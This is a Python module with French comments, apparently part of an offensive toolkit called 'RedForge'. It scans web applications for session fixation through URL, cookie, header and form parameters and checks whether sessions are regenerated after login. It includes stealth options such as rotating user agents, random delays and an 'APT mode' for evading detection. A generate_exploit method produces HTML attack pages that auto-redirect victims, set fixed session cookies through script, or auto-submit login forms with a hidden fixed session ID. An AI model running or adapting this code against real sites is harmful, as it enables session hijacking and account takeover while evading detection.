#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de fixation de session pour RedForge
Détecte et exploite les vulnérabilités de fixation de session
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class SessionFixationConfig:
    """Configuration avancée pour la fixation de session"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    timeout: int = 10
    test_url_fixation: bool = True
    test_cookie_fixation: bool = True
    test_form_fixation: bool = True
    test_header_fixation: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    test_session_regeneration: bool = True
    test_multiple_endpoints: bool = True
    max_endpoints: int = 10


class SessionFixation:
    """Détection et exploitation avancée des fixations de session"""
    
    def __init__(self, config: Optional[SessionFixationConfig] = None):
        """
        Initialise le module de fixation de session
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or SessionFixationConfig()
        
        # Patterns de session
        self.session_patterns = [
            r'(?:session|sid|jsessionid|PHPSESSID|ASP\.NET_SessionId)=([a-zA-Z0-9]+)',
            r'Set-Cookie:\s*([^=]+)=([^;]+)',
            r'Cookie:\s*([^=]+)=([^;]+)',
            r'Session-ID:\s*([a-zA-Z0-9]+)',
            r'X-Session-Token:\s*([a-zA-Z0-9]+)',
            r'Authorization:\s*Bearer\s+([a-zA-Z0-9]+)'
        ]
        
        # ID de session de test
        self.test_session_id = f"FIXATION_TEST_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de fixation de session
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - session_id: ID de session à tester
                - login_url: URL de login
                - credentials: Identifiants de test
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test de fixation de session sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        
        # Extraire les paramètres de session
        session_params = self._extract_session_params_advanced(target, **kwargs)
        
        for idx, param_name in enumerate(session_params):
            if self.config.apt_mode and idx > 5:
                break
            
            if self.config.random_delays:
                time.sleep(random.uniform(0.3, 0.8))
            
            result = self._test_fixation_advanced(target, param_name, **kwargs)
            self.tests_performed += 1
            
            if result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "parameter": param_name,
                    "method": result['method'],
                    "severity": "HIGH",
                    "details": result['details'],
                    "exploit_url": result.get('exploit_url'),
                    "risk_score": 85,
                    "session_id_used": self.test_session_id
                })
                print(f"      ✓ Fixation de session possible: {param_name} ({result['method']})")
        
        # Tester la régénération de session
        if self.config.test_session_regeneration:
            regen_result = self._test_session_regeneration(target, **kwargs)
            if regen_result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "parameter": "session_regeneration",
                    "method": "regeneration",
                    "severity": "HIGH",
                    "details": regen_result['details'],
                    "risk_score": 85
                })
                print(f"      ✓ Absence de régénération de session après login")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'test_url_fixation' in kwargs:
            self.config.test_url_fixation = kwargs['test_url_fixation']
        if 'test_cookie_fixation' in kwargs:
            self.config.test_cookie_fixation = kwargs['test_cookie_fixation']
        if 'test_form_fixation' in kwargs:
            self.config.test_form_fixation = kwargs['test_form_fixation']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_tests = (5, 15)
    
    def _extract_session_params_advanced(self, target: str, **kwargs) -> List[str]:
        """Extrait les paramètres de session potentiels avec analyse avancée"""
        session_params = set()
        
        # Paramètres communs
        common_params = [
            'session', 'sid', 'jsessionid', 'PHPSESSID', 'ASP.NET_SessionId',
            'session_id', 'sessid', 'token', 'access_token', 'auth_token',
            'sessiontoken', 'user_session', 'app_session'
        ]
        session_params.update(common_params)
        
        # Paramètre spécifié
        if kwargs.get('session_id'):
            session_params.add(kwargs['session_id'])
        
        # Extraire de l'URL
        parsed = urlparse(target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                if any(p in param.lower() for p in ['session', 'sid', 'id', 'token']):
                    session_params.add(param)
        
        # Extraire des cookies (si disponibles)
        if kwargs.get('cookies'):
            for cookie_name in kwargs['cookies'].keys():
                if any(p in cookie_name.lower() for p in ['session', 'sid', 'id', 'token']):
                    session_params.add(cookie_name)
        
        return list(session_params)
    
    def _test_fixation_advanced(self, target: str, param_name: str, **kwargs) -> Dict[str, Any]:
        """
        Test avancé si la fixation de session est possible
        
        Args:
            target: URL cible
            param_name: Nom du paramètre de session
            **kwargs: Options supplémentaires
        """
        result = {
            'vulnerable': False,
            'method': None,
            'details': None,
            'exploit_url': None
        }
        
        login_url = kwargs.get('login_url', target)
        username = kwargs.get('username', 'testuser')
        password = kwargs.get('password', 'testpass')
        
        # Méthode 1: Fixation via URL
        if self.config.test_url_fixation:
            url_result = self._test_url_fixation_advanced(target, param_name, login_url,
                                                         username, password)
            if url_result['vulnerable']:
                result.update(url_result)
                result['method'] = 'URL'
                return result
        
        # Méthode 2: Fixation via Cookie
        if self.config.test_cookie_fixation:
            cookie_result = self._test_cookie_fixation_advanced(target, param_name, login_url,
                                                               username, password)
            if cookie_result['vulnerable']:
                result.update(cookie_result)
                result['method'] = 'Cookie'
                return result
        
        # Méthode 3: Fixation via Header
        if self.config.test_header_fixation:
            header_result = self._test_header_fixation(target, param_name, login_url,
                                                      username, password)
            if header_result['vulnerable']:
                result.update(header_result)
                result['method'] = 'Header'
                return result
        
        # Méthode 4: Fixation via Form
        if self.config.test_form_fixation:
            form_result = self._test_form_fixation_advanced(target, param_name, login_url,
                                                           username, password)
            if form_result['vulnerable']:
                result.update(form_result)
                result['method'] = 'Form'
                return result
        
        return result
    
    def _test_url_fixation_advanced(self, target: str, param_name: str,
                                     login_url: str, username: str, password: str) -> Dict[str, Any]:
        """Test avancé de fixation via paramètre URL"""
        result = {
            'vulnerable': False,
            'details': None,
            'exploit_url': None
        }
        
        # Générer un ID de session unique pour ce test
        test_session = f"{self.test_session_id}_URL_{int(time.time())}"
        
        # Construire URL avec session fixée
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        query_params[param_name] = [test_session]
        new_query = urlencode(query_params, doseq=True)
        fixed_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            
            # Étape 1: Accéder avec session fixée (non authentifié)
            response1 = requests.get(fixed_url, headers=headers, timeout=self.config.timeout, 
                                    verify=False, allow_redirects=False)
            cookies1 = response1.cookies
            
            # Étape 2: S'authentifier
            login_data = {'username': username, 'password': password}
            login_response = requests.post(login_url, data=login_data, headers=headers,
                                          cookies=cookies1, timeout=self.config.timeout, verify=False)
            
            # Étape 3: Vérifier si la session est toujours la même après auth
            if test_session in str(login_response.cookies) or test_session in login_response.text:
                result['vulnerable'] = True
                result['details'] = f"Session fixée via URL: {param_name}"
                result['exploit_url'] = fixed_url
                
        except Exception as e:
            if not self.config.passive_detection:
                pass
        
        return result
    
    def _test_cookie_fixation_advanced(self, target: str, param_name: str,
                                        login_url: str, username: str, password: str) -> Dict[str, Any]:
        """Test avancé de fixation via cookie"""
        result = {
            'vulnerable': False,
            'details': None,
            'exploit_url': None
        }
        
        test_session = f"{self.test_session_id}_COOKIE_{int(time.time())}"
        
        try:
            headers = self._get_stealth_headers()
            
            # Étape 1: Définir un cookie avec session fixée
            cookies = {param_name: test_session}
            
            # Étape 2: Accéder avec cookie fixé
            response1 = requests.get(target, headers=headers, cookies=cookies,
                                    timeout=self.config.timeout, verify=False)
            
            # Étape 3: S'authentifier
            login_data = {'username': username, 'password': password}
            login_response = requests.post(login_url, data=login_data, headers=headers,
                                          cookies=cookies, timeout=self.config.timeout, verify=False)
            
            # Étape 4: Vérifier
            if test_session in str(login_response.cookies) or test_session in login_response.text:
                result['vulnerable'] = True
                result['details'] = f"Session fixée via Cookie: {param_name}"
                
        except Exception as e:
            pass
        
        return result
    
    def _test_header_fixation(self, target: str, param_name: str,
                               login_url: str, username: str, password: str) -> Dict[str, Any]:
        """Test de fixation via header HTTP"""
        result = {
            'vulnerable': False,
            'details': None,
            'exploit_url': None
        }
        
        test_session = f"{self.test_session_id}_HEADER_{int(time.time())}"
        
        try:
            headers = self._get_stealth_headers({
                'X-Session-ID': test_session,
                'Session-ID': test_session,
                'Authorization': f'Bearer {test_session}'
            })
            
            # Étape 1: Accéder avec header fixé
            response1 = requests.get(target, headers=headers, timeout=self.config.timeout, verify=False)
            
            # Étape 2: S'authentifier
            login_data = {'username': username, 'password': password}
            login_response = requests.post(login_url, data=login_data, headers=headers,
                                          timeout=self.config.timeout, verify=False)
            
            # Étape 3: Vérifier
            if test_session in str(login_response.cookies) or test_session in login_response.text:
                result['vulnerable'] = True
                result['details'] = f"Session fixée via Header: {param_name}"
                
        except Exception as e:
            pass
        
        return result
    
    def _test_form_fixation_advanced(self, target: str, param_name: str,
                                      login_url: str, username: str, password: str) -> Dict[str, Any]:
        """Test avancé de fixation via formulaire"""
        result = {
            'vulnerable': False,
            'details': None,
            'exploit_url': None
        }
        
        test_session = f"{self.test_session_id}_FORM_{int(time.time())}"
        
        try:
            # Tenter de soumettre un formulaire avec session fixée
            form_data = {
                param_name: test_session,
                'username': username,
                'password': password
            }
            
            headers = self._get_stealth_headers()
            response = requests.post(login_url, data=form_data, headers=headers,
                                    timeout=self.config.timeout, verify=False)
            
            if test_session in str(response.cookies) or test_session in response.text:
                result['vulnerable'] = True
                result['details'] = f"Session fixée via Formulaire: {param_name}"
                
        except Exception as e:
            pass
        
        return result
    
    def _test_session_regeneration(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Teste si la session est régénérée après authentification
        
        Args:
            target: URL cible
            **kwargs: Options supplémentaires
        """
        result = {
            'vulnerable': False,
            'details': None
        }
        
        login_url = kwargs.get('login_url', target)
        username = kwargs.get('username', 'testuser')
        password = kwargs.get('password', 'testpass')
        
        try:
            headers = self._get_stealth_headers()
            
            # Obtenir une session avant login
            pre_login_response = requests.get(target, headers=headers,
                                             timeout=self.config.timeout, verify=False)
            pre_login_cookies = pre_login_response.cookies
            
            # Se connecter
            login_data = {'username': username, 'password': password}
            login_response = requests.post(login_url, data=login_data, headers=headers,
                                          cookies=pre_login_cookies, timeout=self.config.timeout, verify=False)
            
            # Vérifier si les cookies ont changé
            pre_login_cookie_str = str(pre_login_cookies)
            post_login_cookie_str = str(login_response.cookies)
            
            if pre_login_cookie_str == post_login_cookie_str and pre_login_cookie_str:
                result['vulnerable'] = True
                result['details'] = "Session non régénérée après authentification - vulnérable à la fixation"
                
        except Exception as e:
            pass
        
        return result
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "test_url_fixation": self.config.test_url_fixation,
                "test_cookie_fixation": self.config.test_cookie_fixation
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune fixation de session détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_method": {
                "URL": len([v for v in vulnerabilities if v.get('method') == 'URL']),
                "Cookie": len([v for v in vulnerabilities if v.get('method') == 'Cookie']),
                "Header": len([v for v in vulnerabilities if v.get('method') == 'Header']),
                "Form": len([v for v in vulnerabilities if v.get('method') == 'Form']),
                "regeneration": len([v for v in vulnerabilities if v.get('method') == 'regeneration'])
            },
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            method = vuln.get('method', '')
            
            if method in ['URL', 'Cookie', 'Header', 'Form']:
                recommendations.add("Régénérer l'ID de session après authentification")
                recommendations.add("Ne pas accepter les ID de session fournis par l'utilisateur")
                recommendations.add("Lier la session à l'adresse IP ou User-Agent")
            
            if method == 'URL':
                recommendations.add("Ne pas transmettre les ID de session dans l'URL")
            
            if method == 'Cookie':
                recommendations.add("Utiliser l'attribut HttpOnly sur les cookies de session")
            
            if method == 'regeneration':
                recommendations.add("Régénérer l'ID de session après chaque changement de niveau d'authentification")
        
        if not recommendations:
            recommendations.add("Implémenter une régénération de session après login")
            recommendations.add("Utiliser des ID de session cryptographiquement forts")
        
        return list(recommendations)
    
    def generate_exploit(self, target: str, param_name: str, 
                         login_url: str, method: str = "auto") -> str:
        """
        Génère un HTML d'exploit pour la fixation de session
        
        Args:
            target: URL cible
            param_name: Nom du paramètre de session
            login_url: URL de login
            method: Méthode d'exploitation (auto, url, cookie, form)
        """
        session_id = f"FIXED_SESSION_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
        
        if method == "url" or method == "auto":
            exploit_html = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Session Fixation Exploit</title>
                <style>
                    body {{ font-family: monospace; background: #1a202c; color: #68d391; display: flex; justify-content: center; align-items: center; height: 100vh; }}
                    .container {{ text-align: center; }}
                    a {{ color: #68d391; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🎯 Session Fixation Exploit</h1>
                    <p>Cliquez sur le lien ci-dessous pour fixer la session:</p>
                    <a href="{target}?{param_name}={session_id}" target="_blank">
                        {target}?{param_name}={session_id}
                    </a>
                    <p>Puis connectez-vous avec les identifiants fournis.</p>
                    <script>
                        // Redirection automatique
                        window.location.href = '{target}?{param_name}={session_id}';
                    </script>
                </div>
            </body>
            </html>
            '''
        
        elif method == "cookie":
            exploit_html = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Session Fixation Exploit</title>
            </head>
            <body>
                <h1>Session Fixation Attack</h1>
                <p>Veuillez vous connecter pour continuer...</p>
                
                <form method="POST" action="{login_url}">
                    <input type="text" name="username" placeholder="Username">
                    <input type="password" name="password" placeholder="Password">
                    <input type="submit" value="Login">
                </form>
                
                <script>
                    // Définir le cookie de session fixé
                    document.cookie = "{param_name}={session_id}; path=/";
                    
                    // Alternative avec XHR
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '{login_url}', true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send('username=test&password=test');
                </script>
            </body>
            </html>
            '''
        
        else:  # form
            exploit_html = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Session Fixation Exploit</title>
            </head>
            <body>
                <h1>Session Fixation Attack</h1>
                <p>Veuillez vous connecter pour continuer...</p>
                
                <form method="POST" action="{login_url}">
                    <input type="hidden" name="{param_name}" value="{session_id}">
                    <input type="text" name="username" placeholder="Username">
                    <input type="password" name="password" placeholder="Password">
                    <input type="submit" value="Login">
                </form>
                
                <script>
                    // Soumission automatique
                    setTimeout(function() {{
                        document.forms[0].submit();
                    }}, 1000);
                </script>
            </body>
            </html>
            '''
        
        return exploit_html
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    fixation = SessionFixation()
    results = fixation.scan("https://example.com/login")
    print(f"Fixation de session possible: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = SessionFixationConfig(apt_mode=True, test_url_fixation=True)
    fixation_apt = SessionFixation(config=apt_config)
    results_apt = fixation_apt.scan("https://example.com/login", apt_mode=True)
    print(f"Fixation de session (APT): {results_apt['count']}")
    
    # Générer exploit
    if results_apt['vulnerabilities']:
        exploit = fixation_apt.generate_exploit(
            "https://example.com/login",
            "PHPSESSID",
            "https://example.com/login",
            method="url"
        )
        with open("session_fixation_exploit.html", "w") as f:
            f.write(exploit)
        print("Exploit généré: session_fixation_exploit.html")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")